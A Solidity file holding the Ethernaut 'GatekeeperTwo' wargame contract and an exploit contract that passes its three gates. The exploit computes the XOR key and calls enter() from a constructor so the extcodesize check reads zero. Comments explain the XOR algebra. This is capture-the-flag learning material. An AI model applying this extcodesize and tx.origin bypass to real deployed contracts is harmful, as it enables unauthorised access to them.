// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==
                type(uint64).max
        );
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoExploit {
    GatekeeperTwo private immutable gatekeeper;

    constructor(address _keeper) {
        gatekeeper = GatekeeperTwo(_keeper);
        // We want the following condition:
        //  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==
        //         type(uint64).max

        // type(uint64).max = uint64(0)-1 // this is overflow
        // we use communicative property of XOR

        // a ^ b = c
        // a ^ a ^ b = a ^ c
        // a ^ a = 0 (XOR onto itself -> a ^ a)
        // 0 ^ b = b
        // b = a ^ c
        // answer is uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1
        // gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1)

        bytes8 key;
        // since there is an overflow -> place it inside unchecked block
        unchecked {
            key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
        }

        // since we are calling inside constructor -> codesize == 0, at this point, code is
        // not stored in the storage
        gatekeeper.enter(key);
    }
}
